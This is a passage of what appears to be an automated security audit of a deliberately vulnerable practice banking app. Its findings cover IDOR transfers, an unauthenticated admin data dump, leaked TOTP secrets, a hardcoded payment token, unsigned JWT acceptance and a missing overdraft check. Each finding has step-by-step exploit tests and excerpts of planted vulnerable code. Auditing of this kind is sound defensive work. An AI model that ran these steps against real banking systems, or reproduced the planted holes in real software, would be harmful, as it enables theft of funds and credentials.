  "TOTP, when required, is checked against the authenticated attacker rather than the victim and is bypassed if totp_enabled is false or totp_code is omitted"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Services/TransferService.php",
  "line": 175,
  "symbol": "transferExternal",
  "operation": "Account::findById then updateBalance debit"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Attacker authenticates as any customer (public register or forged JWT)",
    "POST /api/transfers/external JSON: from_account_id=<victim account>, amount, attacker-controlled to_bsb/to_account_number (or own address_book_id)",
    "AuthMiddleware authenticates the caller; no account-ownership gate",
    "TransactionController::transferExternal passes from_account_id into TransferService::transferExternal",
    "Account::findById($fromAccountId) loads any account (comment: VULNERABILITY #23); user_id never compared",
    "Account::updateBalance debits the victim and credits the attacker-chosen internal payee"
  ],
  "impact": "Any authenticated customer can debit an arbitrary bank account (including other customers and the FACE Insurance $100M settlements account) and send funds to a payee they control.",
  "severity_reasoning": "This is a complete authenticated IDOR on a money-moving sink. transferOwn correctly uses findByIdAndUser, proving the control exists but is omitted. Account IDs are sequential. TOTP, when required, is checked against the attacker and is skippable if omitted. Direct fund theft.",
  "dynamic_test": "As user A, note a victim from_account_id (e.g. seeded account 1 or 100). POST /api/transfers/external with that from_account_id, a destination BSB/account owned by A, and a small amount, omitting totp_code. Confirm victim balance decreases and A's destination increases."
}
```

#### Validator reasoning

POST /api/transfers/external is authenticated but never authorizes the source account. TransactionController::transferExternal takes JSON from_account_id from the caller and passes it to TransferService::transferExternal. That method loads the source with Account::findById($fromAccountId) (SELECT * FROM accounts WHERE id = ?) and never compares accounts.user_id to the authenticated user. It then debits via Account::updateBalance($fromAccountId, '-' . $debitAmount). Destination payees are scoped to the caller (AddressBookEntry::findByIdAndUser or attacker-supplied BSB/account), so the attacker can send stolen funds to an account they control. Contrast: transferOwn correctly uses Account::findByIdAndUser. Account IDs are AUTO_INCREMENT integers, so they are enumerable. TOTP, when required, is verified against the attacker, not the victim, and is skippable if the attacker has not enabled TOTP or omits the code. No later ownership, is_active, or balance-authorization check blocks the debit. Complete source-to-sink IDOR with fund theft.

#### Code evidence

```
// VULNERABILITY #23: IDOR - no ownership check on source account.
// Any authenticated user can supply any account ID as the source.
$fromAccount = Account::findById($fromAccountId);
if (!$fromAccount) {
    Response::notFound('Source account not found.');
}
```

## 15. Unauthenticated admin export dumps all users, accounts, and transactions

- Lead reference: ENCX-015
- Category: A01
- Severity: HIGH
- Confidence: 99%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/AdminRouter.php:48
- Fingerprint: 52c07f1df73a64362add64f207e68b70f33a88f351454f6e04772de0b5e593ff

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/AdminRouter.php",
  "line": 48,
  "symbol": "dispatch",
  "input": "GET /api/admin/export/users"
}
```

#### Controls encountered

No controls recorded

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/AdminUserController.php",
  "line": 172,
  "symbol": "exportAll",
  "operation": "unauthenticated SELECT * FROM users/accounts/transactions"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "External unauthenticated HTTP client",
    "GET /api/admin/export/users",
    "public/index.php routes /api/admin/* to AdminRouter::dispatch after CORS only",
    "AdminRouter registers the route with auth => false so AdminAuthMiddleware is never invoked",
    "AdminUserController::exportAll runs SELECT * FROM users, accounts, and transactions",
    "Response::success JSON-encodes full rows (password_hash, totp_secret, PAN/CVV, balances, ledger)"
  ],
  "impact": "Unauthenticated mass exfiltration of every customer, account, and transaction including password hashes, TOTP secrets, card numbers/CVVs, balances, and the complete ledger.",
  "severity_reasoning": "Sibling admin routes are auth => true; this export is an explicit opt-out. SELECT * on the shared bankofed database returns SAD and credentials to any caller, including cross-origin browsers because CORS reflects Origin with credentials. High-impact unauthenticated data dump.",
  "dynamic_test": "GET /api/admin/export/users with no Authorization. Confirm 200 JSON contains users[].password_hash and totp_secret, accounts[].card_number/card_cvv/balance, and transactions[].amount. Optionally send Origin: https://evil.example and check Access-Control-Allow-Origin reflects it."
}
```

#### Validator reasoning

GET /api/admin/export/users is a live FastRoute on AdminRouter with auth explicitly false. public/index.php forwards every /api/admin/* request to AdminRouter::dispatch(), which only calls AdminAuthMiddleware when $route['auth'] is truthy, so this handler never authenticates. AdminUserController::exportAll() then runs unbounded SELECT * against users, accounts, and transactions and JSON-encodes the full result set via Response::success(). Schema columns therefore leak password hashes, TOTP secrets, PII, card_number/card_expiry/card_cvv, balances, and full transaction history to any unauthenticated caller. Neighboring admin customer/account/system routes are auth => true, so the skip is specific to this export, not a global admin-auth failure. CORS reflects the request Origin with credentials, so a browser from any origin can also fetch the dump. No IP allowlist, API key, column allowlist, or other control sits on this path.

#### Code evidence

```
$r->addRoute('GET', '/api/admin/export/users', ['handler' => [AdminUserController::class, 'exportAll'], 'auth' => false]);

public static function exportAll(): void
{
    $db = AdminDatabase::getInstance();
    $stmt = $db->query('SELECT * FROM users');
    $users = $stmt->fetchAll();
    $stmt = $db->query('SELECT * FROM accounts');
    $accounts = $stmt->fetchAll();
    $stmt = $db->query('SELECT * FROM transactions ORDER BY created_at DESC');
    $transactions = $stmt->fetchAll();
    Response::success([
        'users'        => $users,
        'accounts'     => $accounts,
        'transactions' => $transactions,
    ]);
}
```

## 16. Auth and profile APIs return password hashes and TOTP secrets

- Lead reference: ENCX-016
- Category: A02
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/User.php:82
- Fingerprint: 94ad6cd14daf86a945885405359f932aa61d102849a7c2eec1e8351acebcc6f2

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/AuthController.php",
  "line": 70,
  "symbol": "login",
  "input": "successful authentication response"
}
```

#### Controls encountered

No controls recorded

#### Sink

```
{
  "file": "BankOfEd-main/src/Models/User.php",
  "line": 84,
  "symbol": "toPublic",
  "operation": "JSON response includes password_hash and totp_secret"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Attacker hits public POST /api/auth/register or /api/auth/login, or authenticated GET/PUT /api/profile",
    "AuthController/ProfileController call User::toPublic on the SELECT * user row",
    "toPublic copies password_hash and totp_secret into the response array",
    "Response::success json_encodes with no field filter",
    "Banking SPA Api.setUser persists the object into localStorage bankofed_user"
  ],
  "impact": "Every auth/profile response discloses crackable password hashes (MD5 for new users) and TOTP seeds; XSS, shared-device access, or the profile IDOR/JWT bypass yields full credential and 2FA theft.",
  "severity_reasoning": "The customer serializer unconditionally includes secrets that AdminUserController::show already omits. Combined with unsalted MD5 on registration and localStorage persistence, a single login response is enough to recover the password and replay TOTP.",
  "dynamic_test": "POST /api/auth/register a new user then inspect the JSON: user.password_hash must be 32-hex MD5 of the password and user.totp_secret present. Repeat GET /api/profile with the issued token and confirm the same fields. Check localStorage bankofed_user after SPA login."
}
```

#### Validator reasoning

User::toPublic() is the customer-facing serializer and it unconditionally copies password_hash and totp_secret into the returned array (User.php:68-86). That object is JSON-encoded with no field filtering by Response::success(). Concrete source-to-sink paths: POST /api/auth/register (AuthController.php:42), POST /api/auth/login (AuthController.php:73), GET /api/profile (ProfileController.php:14), and PUT /api/profile (ProfileController.php:60). AuthService::hashPassword() uses raw MD5, so leaked hashes are immediately crackable. The banking SPA persists the full object: login/register call Api.setUser(res.data.user) which JSON.stringifies into localStorage key bankofed_user; profile save does the same with the PUT response. No authz/encoding/redaction control strips these fields. AdminUserController::show actually omits both secrets, confirming the customer serializer is the defect rather than an intended admin dump. Combined with unsigned JWT decode (AuthService::decodeToken never verifies the signature), GET /api/profile also yields any other user's hash and TOTP seed.

#### Code evidence

```
public static function toPublic(array $user): array
{
    return [
        'id'            => (int)$user['id'],
        'email'         => $user['email'],
        ...
        'totp_enabled'  => (bool)$user['totp_enabled'],
        'password_hash' => $user['password_hash'],
        'totp_secret'   => $user['totp_secret'],
    ];
}
```

## 17. Login issues JWT without verifying TOTP even when 2FA is enabled

- Lead reference: ENCX-017
- Category: A07
- Severity: HIGH
- Confidence: 90%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/AuthController.php:70
- Fingerprint: e6f1aa7db2a95b71a2b5e5bee75558a44227a68afcd5a6fd9d8cafb0f4e2ff8e

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/AuthController.php",
  "line": 48,
  "symbol": "login",
  "input": "JSON email and password"
}
```

#### Controls encountered

```
[
  "Password verification via AuthService::verifyPassword",
  "Email lookup via User::findByEmail",
  "Login input validation limited to email+password (no totp_code)",
  "JWT expiry/revocation in AuthMiddleware (does not encode or require MFA)",
  "TOTP enrollment/disable and TransferService step-up (different sinks; not consulted at login)"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/AuthController.php",
  "line": 70,
  "symbol": "createToken",
  "operation": "JWT issued without TOTP challenge"
}
```

#### Counterevidence

```
[
  "No login TOTP challenge endpoint, validator field, JWT claim, or SPA UI exists — TOTP consumption is implemented for profile enable/disable and TransferService step-up, so a transfer-only 2FA design is possible.",
  "Planted TOTP bypass comments live in TransferService, not AuthController."
]
```

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Attacker who knows or guesses a customer password (or uses a leaked MD5 hash)",
    "POST /api/auth/login with email+password only (auth => false; validator has no totp_code)",
    "AuthController::login verifies password then immediately AuthService::createToken(user.id)",
    "totp_enabled/totp_secret on the user row are never read; TotpService::verify is never called",
    "Full-privilege JWT (iss/sub/jti/iat/exp, no amr/acr) is returned with User::toPublic including totp_secret",
    "AuthMiddleware treats the token as a complete session on every auth => true route"
  ],
  "impact": "Enrolled 2FA is bypassed at login: a stolen/guessed password yields a full banking session and also discloses the TOTP seed, defeating transfer step-up as well.",
  "severity_reasoning": "Product copy, totpSetup/verify/disable, and transfer checkTotpRequired all present TOTP as two-factor authentication, but login never consults it. The issued JWT has no step-up restriction. High impact on a banking login boundary; slightly below critical because first-factor password is still required.",
  "dynamic_test": "Enable TOTP on a test user via /api/profile/totp/setup+verify. POST /api/auth/login with only email and password (no totp_code). Confirm 200 with a JWT that succeeds on GET /api/accounts and POST /api/transfers/own, and that the login body includes totp_secret."
}
```

#### Validator reasoning

POST /api/auth/login is an unauthenticated route that accepts only email and password, verifies the password hash, then immediately mints a full-privilege JWT via AuthService::createToken((int)$user['id']). The user row carries totp_enabled/totp_secret, users can enroll TOTP as “two-factor authentication” (ProfileController totpSetup/totpVerify, README “Auth: JWT + TOTP-based 2FA”, profile copy “Your account is protected with two-factor authentication”), and totpDisable even requires a valid TOTP code — but login() never reads totp_enabled, never accepts totp_code, and never calls TotpService::verify.

The issued token has only iss/sub/jti/iat/exp (no amr/acr/mfa_pending/step-up restriction). AuthMiddleware treats it as a fully authenticated session for every auth=>true route. The SPA login form likewise has no TOTP field, so there is no client-side compensating control.

TOTP is also used as transfer step-up, but that does not block this sink: a stolen/guessed password still yields a session that can read accounts, PII, history, and own-account transfers. Combined with login returning User::toPublic() (which includes totp_secret), even transfer 2FA is immediately recoverable. Concrete source-to-sink path with no effective blocking control.

#### Code evidence

```
if (!AuthService::verifyPassword($data['password'], $user['password_hash'])) {
    Response::error('WRONG_PASSWORD', 'Incorrect password.', 401);
}

$token = AuthService::createToken((int)$user['id']);

Response::success([
    'user'  => User::toPublic($user),
    'token' => $token,
], 'Login successful');
```

## 18. Hardcoded machine token fallback authenticates payment APIs

- Lead reference: ENCX-018
- Category: A07
- Severity: HIGH
- Confidence: 93%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/MachineToken.php:24
- Fingerprint: 067445df5315fe4446a5fe35369ba291124cb683975f89686328fd4da41f588c

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Router.php",
  "line": 72,
  "symbol": "dispatch",
  "input": "Authorization Bearer on /api/payments/*"
}
```

#### Controls encountered

```
[
  "MachineAuthMiddleware requires a Bearer token, but the compiled default mch_face_insurance_secret_key_2026 satisfies it",
  "PaymentController::transfer restricts configured_machine_token/face_insurance to merchant account id 100 or user_id 16, which still allows debit of the seeded FACE Insurance $100M account",
  "process() performs merchant/card/Luhn/expiry checks but does not bind the caller to a merchant and does not require CVV unless the attacker sends one"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Models/MachineToken.php",
  "line": 26,
  "symbol": "validateToken",
  "operation": "accept hardcoded machine_token fallback"
}
```

#### Counterevidence

```
[
  "On a seeded DB the SHA2 of the same secret is already in machine_tokens, so validateToken returns face_insurance before the fallback; impact is identical because transfer treats both names the same",
  "This repo is a pentest/scanner practice app with other demo credentials, but deploy.sh still ships the machine token as a compiled production default"
]
```

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Unauthenticated caller presents Authorization: Bearer mch_face_insurance_secret_key_2026",
    "POST /api/payments/process or POST /api/payments/transfer (Router auth => 'machine')",
    "MachineAuthMiddleware::handle extracts the Bearer token and calls MachineToken::validateToken",
    "DB hash lookup misses or is inactive; fallback compares plaintext to config machine_token default mch_face_insurance_secret_key_2026",
    "Synthetic machine configured_machine_token (or seeded face_insurance) is accepted",
    "PaymentController::process charges any card; transfer() debits FACE Insurance merchant account id 100 / user_id 16"
  ],
  "impact": "Anyone who knows the compiled default machine secret can invoke payment processing and drain the seeded FACE Insurance ~$100M merchant account or charge customer cards without a customer login.",
  "severity_reasoning": "The fallback is fail-open after any DB miss, config/app.php hardcodes the same default, and Docker/deploy/.env.example never set MACHINE_TOKEN. Tests assert the default validates. Machine auth is therefore a published credential, not a secret. High-impact unauthenticated fund movement.",
  "dynamic_test": "POST /api/payments/process with Authorization: Bearer mch_face_insurance_secret_key_2026, a seeded PAN/expiry (e.g. 4532015001345674 / 08/29), merchant_id faceinsurance, and amount, omitting cvv. Confirm 200 and merchant/card balances change. Repeat POST /api/payments/transfer debiting the FACE Insurance source account."
}
```

#### Validator reasoning

Concrete source-to-sink path with no effective blocking control.

Source: unauthenticated POST /api/payments/process and /api/payments/transfer send Authorization: Bearer. Router.php:71-72 marks both routes auth => 'machine'; dispatch() at Router.php:113-114 calls MachineAuthMiddleware::handle(), which extracts the Bearer token and calls MachineToken::validateToken().

Sink: MachineToken::validateToken() hashes the presented secret and looks up machine_tokens. On miss (or inactive row, because the query requires is_active = 1), it fail-opens: it loads config/app.php and accepts $config['machine_token'] ?? 'mch_face_insurance_secret_key_2026' as a synthetic machine named configured_machine_token. config/app.php itself hardcodes the same default via getenv('MACHINE_TOKEN') ?: 'mch_face_insurance_secret_key_2026'. .env.example and deploy.sh never set MACHINE_TOKEN, so production deploys keep this compiled secret. Revoking the DB row does not close the hole.

Impact: process() never inspects $auth after middleware, so the known secret can charge any credit card (seeded PANs/expiries/CVVs are in install/seed.sql; CVV is only checked if the caller supplies one). transfer() allows configured_machine_token (and face_insurance) to debit the faceinsurance merchant account (seeded as 062-001 88880001, $100,000,000) or any user_id 16 account, then credit an arbitrary destination. Same secret is also seeded as SHA2 in machine_tokens, so even the DB-hit path authenticates it as face_insurance with identical transfer rights.

Bearer-required middleware is satisfied by the hardcoded value. The transfer account-scope check is not a block: it still permits draining the merchant/user-16 accounts.

#### Code evidence

```
$config = require __DIR__ . '/../../config/app.php';
$fallbackToken = $config['machine_token'] ?? 'mch_face_insurance_secret_key_2026';
if ($rawToken === $fallbackToken) {
    return [
        'id' => 0,
        'name' => 'configured_machine_token',
        'is_active' => 1,
    ];
}
```

## 19. Unauthenticated /api/health leaks JWT secret and database credentials

- Lead reference: ENCX-019
- Category: A02
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Router.php:25
- Fingerprint: 9ab8207118aee5ef2654d7133663d808eb80f6d0c8fe0b94c89313eb761702fa

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Router.php",
  "line": 87,
  "symbol": "health",
  "input": "unauthenticated GET /api/health"
}
```

#### Controls encountered

No controls recorded

#### Sink

```
{
  "file": "BankOfEd-main/src/Router.php",
  "line": 32,
  "symbol": "Response::success",
  "operation": "json_encode config including jwt_secret"
}
```

#### Counterevidence

```
[
  "db_pass is not included in the health JSON (only db_host, db_name, db_user).",
  "AuthService::decodeToken does not verify HS256, so customer JWT forgery does not strictly require the leaked secret."
]
```

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Internet client → public/index.php → Router::dispatch GET /api/health with no credentials",
    "Route auth => false skips AuthMiddleware entirely",
    "Router::health() loads live config/app.php including jwt_secret (env JWT_SECRET or default bankofed-dev-secret-change-in-production), db_host, db_name, db_user",
    "Response::success emits those values in JSON — this is the cryptographic-secret disclosure sink (A02) rather than the missing-auth classification of the sibling finding"
  ],
  "impact": "Recovery of the HS256 customer signing secret and database identity, enabling forged customer JWTs (if verification were on) and DB targeting.",
  "severity_reasoning": "High: unauthenticated disclosure of the live HMAC key and DB coordinates. Same reachable sink as ENCX-003, framed as cryptographic failure because the secret itself is the asset.",
  "dynamic_test": "Unauthenticated GET /api/health. Assert data.jwt_secret is non-empty and equals getenv JWT_SECRET or the hardcoded default, and that db_host/db_name/db_user are present. Use the leaked secret only as an oracle that the config was dumped — signature verification is separately broken."
}
```

#### Validator reasoning

GET /api/health is a live FastRoute mapping with auth => false. Router::dispatch() only invokes AuthMiddleware when the route flag is true, so the health handler runs with no authentication. Router::health() requires the live config/app.php array and passes jwt_secret, db_host, db_name, and db_user into Response::success(), which json_encodes the payload and echoes it to the client. config/app.php sources jwt_secret from JWT_SECRET (default bankofed-dev-secret-change-in-production) and uses HS256; AuthService::createToken() signs customer JWTs with that same secret. public/index.php forwards all /api/* requests to Router::dispatch() and CorsMiddleware reflects any Origin, so any unauthenticated caller can retrieve the signing secret and database identity. db_pass is not included in this response, and customer token verification currently ignores signatures, but neither is an effective control on this leak.

#### Code evidence

```
public static function health(): void
{
    $config = require __DIR__ . '/../config/app.php';
    Response::success([
        'status'      => 'ok',
        'php_version' => PHP_VERSION,
        'server'      => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
        'db_host'     => $config['db_host'],
        'db_name'     => $config['db_name'],
        'db_user'     => $config['db_user'],
        'jwt_secret'  => $config['jwt_secret'],
        'environment' => getenv('APP_ENV') ?: 'production',
    ]);
}
// route: $r->addRoute('GET', '/api/health', ['handler' => [self::class, 'health'], 'auth' => false]);

public static function health(): void
{
    $config = require __DIR__ . '/../config/app.php';
    Response::success([
        'status'      => 'ok',
        'php_version' => PHP_VERSION,
        'server'      => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
        'db_host'     => $config['db_host'],
        'db_name'     => $config['db_name'],
        'db_user'     => $config['db_user'],
        'jwt_secret'  => $config['jwt_secret'],
        'environment' => getenv('APP_ENV') ?: 'production',
    ]);
}

$r->addRoute('GET', '/api/health', ['handler' => [self::class, 'health'], 'auth' => false]);
```

## 20. Customer JWT signatures are never verified

- Lead reference: ENCX-020
- Category: A02
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/AuthService.php:50
- Fingerprint: cfa4cc372ba4e0411cbf3e280e815facc9b4859fbe706aa4bdbc3bdc7cba6af0

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Middleware/AuthMiddleware.php",
  "line": 21,
  "symbol": "AuthMiddleware::handle",
  "input": "HTTP Authorization Bearer JWT"
}
```

#### Controls encountered

```
[
  "Bearer Authorization header required (format only; attacker supplies Bearer <forged JWT>)",
  "Three JWT segments required (attacker supplies dummy signature part)",
  "exp claim must be in the future (attacker sets exp arbitrarily far ahead)",
  "jti revocation lookup after decode (only hits previously revoked JTIs; attacker uses a fresh jti)",
  "User::findById($payload->sub) must resolve (user ids are sequential integers from registration; sub is attacker-controlled)",
  "TOTP on some external transfers (not applied to identity, own-account transfers, profile, accounts, history, or insurance SSO)"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Services/AuthService.php",
  "line": 58,
  "symbol": "decodeToken",
  "operation": "unverified JWT payload accepted as identity"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "External caller supplies Authorization: Bearer <forged three-part JWT> to any Router customer route with auth => true",
    "AuthMiddleware::handle is the sole gate; it calls AuthService::decodeToken",
    "decodeToken never loads jwt_secret and never calls JWT::decode — it only checks part count, JSON payload, and exp > now",
    "payload.sub is passed to User::findById and that user is injected into controllers for transfers, address-book, transactions, insurance SSO"
  ],
  "impact": "Unauthenticated impersonation of any customer on every authenticated banking operation, including external transfers and insurance SSO.",
  "severity_reasoning": "High: complete bypass of customer authentication. Distinct from the health-leak finding: even a rotated secret cannot bind tokens because verification is absent.",
  "dynamic_test": "Forge JWT payload {sub:1,jti:fresh,exp:future} without signing. Call GET /api/profile and POST /api/transfers/external as that user. Expect 200 with Amelia Chen's profile / a completed transfer, not 401 Invalid token."
}
```

#### Validator reasoning

Customer authentication never verifies JWT integrity. AuthService::createToken() signs with Firebase JWT HS256 and jwt_secret, but AuthService::decodeToken() (AuthService.php:50-66) only explode()s on '.', requires three segments, base64-decodes the payload, and accepts it if exp is in the future. The signature segment is unused; jwt_secret and JWT::decode() are never consulted. The file even comments “Decode token payload without strict signature verification.” Firebase\JWT\Key and ExpiredException are imported but dead on the decode path.

Router::dispatch() (Router.php:111-113) invokes AuthMiddleware::handle() for every route with auth => true, including GET /api/profile, transfers, address-book, accounts, transaction history, and insurance SSO. AuthMiddleware extracts Authorization: Bearer, calls decodeToken(), checks revoked_tokens by jti, then User::findById($payload->sub) and returns that row as the request identity. Controllers consume $auth['user'] as the customer (ProfileController::show, AccountController::index, TransferService::transferOwn/transferExternal, InsuranceController::ssoUrl).

An attacker can mint header.payload.sig with arbitrary sub (existing integer user id), a future exp, and a fresh jti. PHP will coerce JSON numeric sub into User::findById(int). No later controller re-validates the token. TOTP is not a gate on identity: own-account transfers skip it, and many authenticated reads/writes never check it.

Contrast: AdminAuthMiddleware correctly uses JWT::decode($token, new Key($config['jwt_secret'], $config['jwt_algorithm'])). The customer path is therefore a complete, exploitable authn bypass, not a framework limitation.

#### Code evidence

```
public static function decodeToken(string $token): ?object
{
    try {
        // Decode token payload without strict signature verification
        $parts = explode('.', $token);
        if (count($parts) !== 3) {
            return null;
        }
        $payload = json_decode(base64_decode(strtr($parts[1], '-_', '+')));
        if (!$payload || !isset($payload->exp) || $payload->exp < time()) {
            return null;
        }
        return $payload;
    } catch (\Exception $e) {
        return null;
    }
}
```

## 21. External transfers debit any source account without ownership check

- Lead reference: ENCX-021
- Category: A01
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/TransferService.php:174
- Fingerprint: 467d1297b2623c6e31a06cfd8b592e0322d266a90be586bbb0aa259a182b6774

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 110,
  "symbol": "transferExternal",
  "input": "JSON from_account_id"
}
```

#### Controls encountered

```
[
  "Route requires a Bearer token via AuthMiddleware, but AuthService::decodeToken only base64-decodes the payload and checks exp — signature is not verified.",
  "AddressBookEntry::findByIdAndUser scopes payees to the caller; this does not constrain from_account_id.",
  "TOTP may be required for manual/unverified payees but is skipped when totp_enabled is false or totp_code is omitted.",
  "transferOwn uses Account::findByIdAndUser; that helper is not applied on the external-transfer source."
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Services/TransferService.php",
  "line": 174,
  "symbol": "Account::findById",
  "operation": "debit source account without ownership check"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Attacker authenticates as any customer (password login or unsigned forged JWT)",
    "POST /api/transfers/external (Router auth => true) → TransactionController::transferExternal forwards JSON from_account_id, to_bsb, to_account_number, amount",
    "TransferService::transferExternal loads the source with Account::findById($fromAccountId) — comment documents VULNERABILITY #23 IDOR; findByIdAndUser is not used (unlike transferOwn)",
    "No later ownership check; Account::updateBalance($fromAccountId, '-amount') debits the victim; destination BSB/account (attacker-controlled) is credited if internal"
  ],
  "impact": "Any logged-in or forged-JWT user can debit another customer's account and send funds to an attacker-controlled payee.",
  "severity_reasoning": "High: direct unauthorized money movement across customers. Combined with missing balance checks this is account-drain, but this path's distinct cause is the unscope-checked source account id.",
  "dynamic_test": "As user 2, POST /api/transfers/external with from_account_id=1 (Amelia Chen Everyday, seeded id 1), to_bsb/to_account_number owned by the attacker or user 2, amount 10.00, omit totp_code. Confirm 201 and that account 1 balance decreased while the destination increased. transferOwn with the same from_account_id should 404 (ownership enforced there)."
}
```

#### Validator reasoning

POST /api/transfers/external is a live authenticated route (Router.php) that hands JSON from_account_id straight into TransferService::transferExternal with no ownership check. The service loads the source with Account::findById (SELECT * FROM accounts WHERE id = ?) rather than findByIdAndUser, then Account::updateBalance($fromAccountId, '-' . $debitAmount) debits that row. Destination is attacker-controlled: a manual to_bsb/to_account_number pair is accepted, and if it matches an internal account (findByBsbAndNumber) that account is credited. Seeded accounts use sequential auto-increment IDs (user 1 = 1–3, user 2 = 4–5, …), so any logged-in user can debit another customer and credit their own BSB/number. Contrast: transferOwn correctly uses findByIdAndUser for both sides. Address-book scoping only constrains the payee, not the source. TOTP is not a blocking control (proceeds when totp is disabled or the code is omitted). JWT is required but decodeToken never verifies the signature, so even a forged Bearer token for a real user id is enough. No other check of user_id, is_active, account_type, or balance sits on this path.

#### Code evidence

```
// VULNERABILITY #23: IDOR - no ownership check on source account.
// Any authenticated user can supply any account ID as the source.
$fromAccount = Account::findById($fromAccountId);
if (!$fromAccount) {
    Response::notFound('Source account not found.');
}
```

## 22. External transfers skip balance checks allowing unlimited overdraft

- Lead reference: ENCX-022
- Category: A04
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/TransferService.php:212
- Fingerprint: e42627574c41938216850d91c4240de72b54c7424d8a48902044a261e6599891

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 110,
  "symbol": "transferExternal",
  "input": "JSON amount"
}
```

#### Controls encountered

```
[
  "Bearer auth on POST /api/transfers/external",
  "Amount must be required decimal:2 and > 0",
  "Source account must exist",
  "TOTP may be required for some transfer types (bypassable; not a funds check)"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Services/TransferService.php",
  "line": 269,
  "symbol": "Account::updateBalance",
  "operation": "debit without sufficient-funds check"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Authenticated POST /api/transfers/external reaches TransferService::transferExternal",
    "After resolving the source account, the balance comparison that exists in transferOwn is absent — in-code comment: VULNERABILITY #9 No balance check on external transfers",
    "Account::updateBalance applies '-' . $debitAmount regardless of current balance or account_type (transaction/fx/loan)",
    "Transaction is committed as status=completed even when the result is a large negative balance"
  ],
  "impact": "Unlimited overdraft of any reachable source account (including via the source-account IDOR): drain transaction/FX accounts below zero and inflate attacker-controlled payees, creating money.",
  "severity_reasoning": "High: missing financial invariant on the money-out path. Against the caller's own account it already creates funds; combined with IDOR it overdraws every customer.",
  "dynamic_test": "POST /api/transfers/external from an account whose balance is known (e.g. user 6 Everyday 920.00, id 14) with amount 100000.00 to an attacker payee. Confirm 201, new_from_balance negative, and destination credited. Contrast with POST /api/transfers/own which still returns INSUFFICIENT_FUNDS for transaction/fx accounts."
}
```

#### Validator reasoning

POST /api/transfers/external is a live authenticated route (Router.php) that calls TransactionController::transferExternal, which only requires a positive decimal amount and then invokes TransferService::transferExternal. In transferExternal the source account is loaded with Account::findById (no ownership check) and there is an explicit comment that the remaining-funds comparison was removed. No later guard compares $debitAmount to $fromAccount['balance'] (unlike transferOwn, which rejects transaction/fx overdrafts with INSUFFICIENT_FUNDS). TOTP is not a funds control and is skippable when totp is unset or the code is omitted. The sink Account::updateBalance issues UPDATE accounts SET balance = balance + ? WHERE id = ? with a negative debit; the accounts.balance column is a signed DECIMAL(15,2) with no CHECK/UNSIGNED constraint. An authenticated caller can therefore overdraw their own transaction/FX account (or, via the source-account IDOR, any account) by an arbitrary amount and credit an internal or external payee, creating money.

#### Code evidence

```
// VULNERABILITY #9: No balance check on external transfers — removed to allow unlimited overdraft

// Determine transfer type and resolve payee details
if ($addressBookId !== null) {
    $transferType = 'address_book';
    $entry = AddressBookEntry::findByIdAndUser($addressBookId, $userId);
...
Database::beginTransaction();
try {
    Account::updateBalance($fromAccountId, '-' . $debitAmount);
    if ($toAccountId !== null) {
        Account::updateBalance($toAccountId, $creditAmount);
    }
```

## 23. TOTP step-up on external transfers can be skipped

- Lead reference: ENCX-023
- Category: A07
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/TransferService.php:234
- Fingerprint: e8cf359cc619ab135d358e6798b8e4b1b2da3141a1e54738692d67191bcb9eb7

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 120,
  "symbol": "transferExternal",
  "input": "JSON totp_code"
}
```

#### Controls encountered

```
[
  "AuthMiddleware Bearer JWT on POST /api/transfers/external",
  "TransferService::checkTotpRequired consulted for manual and unverified address-book transfers",
  "TotpService::verify rejects a supplied invalid code when totp_enabled is true",
  "Client-only TOTP prompt in public/banking/js/pages/transfers.js"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Services/TransferService.php",
  "line": 237,
  "symbol": "transferExternal",
